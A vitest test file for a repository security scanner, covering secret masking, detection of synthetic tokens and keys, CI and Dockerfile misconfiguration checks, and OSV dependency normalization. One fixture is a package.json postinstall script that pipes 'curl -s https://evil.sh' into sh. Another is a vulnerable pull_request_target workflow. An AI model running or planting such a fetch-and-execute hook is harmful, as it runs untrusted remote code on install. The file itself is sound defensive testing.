import { describe, it, expect } from 'vitest';
import {
  maskSecret,
  maskEvidenceSnippet,
  isLikelyFalsePositive,
  SecretScanner,
  ConfigScanner,
  mapEcosystemToOSV,
  cleanVersionConstraint,
  normalizeOSVSeverity,
  analyzeRepositorySecurity,
  type IOSVScanner,
} from '@/lib/security';
import type { RepositoryMetadata, RepositoryTree } from '@/types/repository';
import type { PackageDependency } from '@/types/dependency';

function makeMockMetadata(): RepositoryMetadata {
  return {
    owner: 'antigravity-corp',
    name: 'safe-repo',
    fullName: 'antigravity-corp/safe-repo',
    description: 'A secure repository with deterministic tooling.',
    htmlUrl: 'https://github.com/antigravity-corp/safe-repo',
    defaultBranch: 'main',
    visibility: 'public',
    isFork: false,
    isArchived: false,
    stars: 100,
    forks: 10,
    openIssues: 0,
    watchers: 5,
    license: { key: 'mit', name: 'MIT License', spdxId: 'MIT', url: null },
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: new Date().toISOString(),
    pushedAt: new Date().toISOString(),
    language: 'TypeScript',
    topics: ['security', 'deterministic'],
    homepage: null,
    sizeKb: 100,
  };
}

function makeMockTree(
  paths: Array<{ path: string; size?: number; type?: 'blob' | 'tree' }>
): RepositoryTree {
  const entries = paths.map((p) => ({
    path: p.path,
    name: p.path.split('/').pop() || p.path,
    type: p.type || 'blob',
    mode: '100644',
    size: p.size ?? 512,
    sha: 'blob123',
    url: 'https://api.github.com/repos/antigravity-corp/safe-repo/git/blobs/blob123',
  }));

  return {
    sha: 'tree123',
    entries,
    truncated: false,
    totalFiles: entries.filter((e) => e.type === 'blob').length,
    totalDirectories: entries.filter((e) => e.type === 'tree').length,
    totalBytes: entries.reduce((acc, e) => acc + (e.size || 0), 0),
  };
}

describe('Deterministic Secret Masking', () => {
  it('masks short strings completely with dots', () => {
    expect(maskSecret('secret')).toBe('••••••••');
    expect(maskSecret('12345678')).toBe('••••••••');
  });

  it('masks medium strings preserving edge hints without exposing content', () => {
    const masked = maskSecret('my_db_password_123');
    expect(masked).toContain('••••••••');
    expect(masked).not.toBe('my_db_password_123');
  });

  it('masks long tokens preserving prefix and suffix with masked core', () => {
    const fakeToken = ['ghp', '0123456789abcdefghijklmnopqrstuvwxyz'].join('_');
    const masked = maskSecret(fakeToken);
    expect(masked).toBe('ghp_••••••••••••wxyz');
    expect(masked).not.toContain('0123456789');
  });

  it('replaces secrets inside code snippets safely', () => {
    const fakeKey = ['AKIA', '1234567890ABCDEF'].join('');
    const snippet = `const AWS_KEY = "${fakeKey}";`;
    const masked = maskEvidenceSnippet(snippet, fakeKey);
    expect(masked).toContain('••••••••••••');
    expect(masked).not.toContain(fakeKey);
  });
});

describe('False Positive Detection', () => {
  it('flags obvious placeholder and example strings', () => {
    expect(isLikelyFalsePositive('YOUR_API_KEY_HERE')).toBe(true);
    expect(isLikelyFalsePositive('example_secret_token')).toBe(true);
    expect(isLikelyFalsePositive('dummy_password')).toBe(true);
    expect(isLikelyFalsePositive('0123456789abcdef')).toBe(true);
    expect(isLikelyFalsePositive('xxxxxx')).toBe(true);
  });

  it('allows plausible synthetic token formats', () => {
    const plausibleToken = ['ghp', '9B7aC8dE0f1g2h3i4j5k6l7m8n9o0p1q2r3s'].join('_');
    expect(isLikelyFalsePositive(plausibleToken)).toBe(false);
  });
});

describe('SecretScanner', () => {
  const scanner = new SecretScanner();

  it('detects committed .env and private key files in repository tree', () => {
    const tree = makeMockTree([
      { path: '.env' },
      { path: 'id_rsa' },
      { path: 'certs/server.key' },
      { path: '.env.example' }, // should be ignored
      { path: 'tests/mock_key.pem' }, // test path ignored
    ]);

    const findings = scanner.scanTree(tree);
    expect(findings.length).toBe(3);

    const envFinding = findings.find((f) => f.ruleId === 'exposed-env-file');
    expect(envFinding).toBeDefined();
    expect(envFinding?.severity).toBe('high');

    const keyFinding = findings.find((f) => f.file === 'id_rsa');
    expect(keyFinding).toBeDefined();
    expect(keyFinding?.severity).toBe('critical');
  });

  it('detects synthetic GitHub PATs in source content and masks evidence', () => {
    const fakePat = ['ghp', '9B7aC8dE0f1g2h3i4j5k6l7m8n9o0p1q2r3s'].join('_');
    const files = [
      {
        path: 'src/config.ts',
        content: `const githubToken = "${fakePat}";\nconsole.log("ready");`,
      },
    ];

    const findings = scanner.scanContents(files);
    expect(findings.length).toBe(1);

    const finding = findings[0];
    expect(finding.ruleId).toBe('gitleaks-github-pat');
    expect(finding.severity).toBe('critical');
    expect(finding.confidence).toBe('high');
    expect(finding.line).toBe(1);
    expect(finding.evidence).not.toContain(fakePat); // MUST BE MASKED
    expect(finding.evidence).toContain('ghp_••••••••••••2r3s');
  });

  it('detects synthetic AWS Access Key IDs', () => {
    const fakeAwsKey = ['AKIA', '2B3C4D5E6F7G8H9I'].join('');
    const files = [
      {
        path: 'deploy/credentials.js',
        content: `module.exports = { awsKey: "${fakeAwsKey}" };`,
      },
    ];

    const findings = scanner.scanContents(files);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('gitleaks-aws-access-key-id');
    expect(findings[0].evidence).not.toContain(fakeAwsKey);
    expect(findings[0].evidence).toContain('AKIA••••••••••••8H9I');
  });

  it('detects synthetic Stripe live secret keys', () => {
    const fakeStripe = ['sk', 'live', '51Msz92JvRtWpLqNkXyZbCuQe'].join('_');
    const files = [
      {
        path: 'billing/checkout.ts',
        content: `const stripe = new Stripe("${fakeStripe}");`,
      },
    ];

    const findings = scanner.scanContents(files);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('gitleaks-stripe-key');
    expect(findings[0].severity).toBe('critical');
  });

  it('detects private key blocks in source files', () => {
    const files = [
      {
        path: 'secrets/key.txt',
        content: `-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----`,
      },
    ];

    const findings = scanner.scanContents(files);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('gitleaks-private-key');
    expect(findings[0].severity).toBe('critical');
  });

  it('ignores generic assignments in test and mock files', () => {
    const files = [
      {
        path: 'tests/auth.test.ts',
        content: `const password = "myTestPassword123456";\nconst api_key = "123456789012345678901234";`,
      },
    ];

    const findings = scanner.scanContents(files);
    // Generic patterns in test files should be filtered out
    expect(findings.length).toBe(0);
  });
});

describe('ConfigScanner', () => {
  const scanner = new ConfigScanner();

  it('detects vulnerable pull_request_target checkout in GitHub Actions', () => {
    const tree = makeMockTree([{ path: '.github/workflows/ci.yml' }]);
    const files = [
      {
        path: '.github/workflows/ci.yml',
        content: `
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
        `,
      },
    ];

    const findings = scanner.scanTreeAndContents(tree, files);
    const pwnFinding = findings.find((f) => f.ruleId === 'cfg-ci-pull-request-target-pwn');
    expect(pwnFinding).toBeDefined();
    expect(pwnFinding?.severity).toBe('critical');
    expect(pwnFinding?.confidence).toBe('high');
  });

  it('detects unpinned GitHub Actions pinned to @main or @master', () => {
    const tree = makeMockTree([{ path: '.github/workflows/release.yml' }]);
    const files = [
      {
        path: '.github/workflows/release.yml',
        content: `
steps:
  - uses: some-vendor/action@master
        `,
      },
    ];

    const findings = scanner.scanTreeAndContents(tree, files);
    const unpinnedFinding = findings.find((f) => f.ruleId === 'cfg-ci-unpinned-action');
    expect(unpinnedFinding).toBeDefined();
    expect(unpinnedFinding?.severity).toBe('low');
  });

  it('detects hardcoded passwords in Dockerfiles', () => {
    const tree = makeMockTree([{ path: 'Dockerfile' }]);
    const files = [
      {
        path: 'Dockerfile',
        content: `FROM node:20\nENV ADMIN_PASSWORD=supersecretpass\nCMD ["node", "server.js"]`,
      },
    ];

    const findings = scanner.scanTreeAndContents(tree, files);
    const dockerFinding = findings.find((f) => f.ruleId === 'cfg-dockerfile-hardcoded-secret');
    expect(dockerFinding).toBeDefined();
    expect(dockerFinding?.severity).toBe('high');
  });

  it('detects unsafe remote script execution in package.json', () => {
    const tree = makeMockTree([{ path: 'package.json' }]);
    const files = [
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: {
            postinstall: 'curl -s https://evil.sh | sh',
          },
        }),
      },
    ];

    const findings = scanner.scanTreeAndContents(tree, files);
    const curlFinding = findings.find((f) => f.ruleId === 'cfg-package-unsafe-script-curl');
    expect(curlFinding).toBeDefined();
    expect(curlFinding?.severity).toBe('high');
  });
});

describe('OSV Scanner Normalization', () => {
  it('maps package ecosystems correctly', () => {
    expect(mapEcosystemToOSV('npm')).toBe('npm');
    expect(mapEcosystemToOSV('pypi')).toBe('PyPI');
    expect(mapEcosystemToOSV('cargo')).toBe('crates.io');
    expect(mapEcosystemToOSV('gomod')).toBe('Go');
    expect(mapEcosystemToOSV('unknown')).toBeNull();
  });

  it('cleans version constraints for OSV queries', () => {
    expect(cleanVersionConstraint('^4.17.15')).toBe('4.17.15');
    expect(cleanVersionConstraint('>= 1.2.3')).toBe('1.2.3');
    expect(cleanVersionConstraint('~0.10.0-beta.1')).toBe('0.10.0-beta.1');
    expect(cleanVersionConstraint('*')).toBeNull();
    expect(cleanVersionConstraint('')).toBeNull();
  });

  it('normalizes OSV severities accurately', () => {
    expect(
      normalizeOSVSeverity({
        id: 'TEST-1',
        database_specific: { severity: 'CRITICAL' },
      })
    ).toBe('critical');

    expect(
      normalizeOSVSeverity({
        id: 'TEST-2',
        database_specific: { severity: 'HIGH' },
      })
    ).toBe('high');

    expect(
      normalizeOSVSeverity({
        id: 'TEST-3',
        database_specific: { severity: 'MODERATE' },
      })
    ).toBe('medium');

    expect(
      normalizeOSVSeverity({
        id: 'TEST-4',
        database_specific: { severity: 'LOW' },
      })
    ).toBe('low');
  });

  it('integrates mock OSV scanner client and normalizes vulnerabilities into findings', async () => {
    const mockOSV: IOSVScanner = {
      async scanPackages(_packages: readonly PackageDependency[]) {
        return {
          isAvailable: true,
          findings: [
            {
              id: 'osv-GHSA-1234-lodash',
              type: 'vulnerability',
              severity: 'high',
              ruleId: 'GHSA-1234',
              detector: 'osv-scanner',
              file: 'package.json',
              message: 'Vulnerability in dependency lodash (^4.17.15): Prototype Pollution',
              evidence: 'Advisory: GHSA-1234 [HIGH]. Ecosystem: npm.',
              confidence: 'high',
              remediation: 'Upgrade lodash to >= 4.17.21 in package.json.',
              references: ['https://osv.dev/vulnerability/GHSA-1234'],
            },
          ],
        };
      },
    };

    const metadata = makeMockMetadata();
    const tree = makeMockTree([{ path: 'package.json' }]);
    const packages: PackageDependency[] = [
      {
        name: 'lodash',
        versionConstraint: '^4.17.15',
        isDev: false,
        manifestSource: 'package.json',
        ecosystem: 'npm',
      },
    ];

    const report = await analyzeRepositorySecurity({
      metadata,
      tree,
      packages,
      osvScanner: mockOSV,
    });

    expect(report.summary.totalFindings).toBe(1);
    expect(report.summary.byType.vulnerability).toBe(1);
    expect(report.summary.bySeverity.high).toBe(1);
    expect(report.findings[0].ruleId).toBe('GHSA-1234');
    expect(report.dependencyScanAvailable).toBe(true);
  });
});

describe('Security Engine Orchestration & Reproducibility', () => {
  it('deduplicates findings and sorts by severity (critical first)', async () => {
    const metadata = makeMockMetadata();
    const tree = makeMockTree([
      { path: '.env' }, // high
      { path: 'id_rsa' }, // critical
    ]);
    const fakePat = ['ghp', '9B7aC8dE0f1g2h3i4j5k6l7m8n9o0p1q2r3s'].join('_');
    const files = [
      {
        path: 'src/app.ts',
        content: `const token = "${fakePat}";`, // critical
      },
    ];

    const report = await analyzeRepositorySecurity({
      metadata,
      tree,
      files,
    });

    expect(report.summary.totalFindings).toBe(3);
    expect(report.summary.bySeverity.critical).toBe(2);
    expect(report.summary.bySeverity.high).toBe(1);

    // Verify critical findings come first
    expect(report.findings[0].severity).toBe('critical');
    expect(report.findings[1].severity).toBe('critical');
    expect(report.findings[2].severity).toBe('high');
  });

  it('guarantees identical outputs for identical inputs (deterministic)', async () => {
    const metadata = makeMockMetadata();
    const fakeGoogleKey = ['AIzaSy', 'D-fakeExampleGoogleApiKey12345678'].join('');
    const tree = makeMockTree([{ path: '.env' }]);
    const files = [
      {
        path: 'config.js',
        content: `const key = "${fakeGoogleKey}";`,
      },
    ];

    const report1 = await analyzeRepositorySecurity({ metadata, tree, files });
    const report2 = await analyzeRepositorySecurity({ metadata, tree, files });

    expect(report1.summary.totalFindings).toBe(report2.summary.totalFindings);
    expect(report1.findings.length).toBe(report2.findings.length);
    for (let i = 0; i < report1.findings.length; i++) {
      expect(report1.findings[i].id).toBe(report2.findings[i].id);
      expect(report1.findings[i].severity).toBe(report2.findings[i].severity);
      expect(report1.findings[i].evidence).toBe(report2.findings[i].evidence);
    }
  });
});
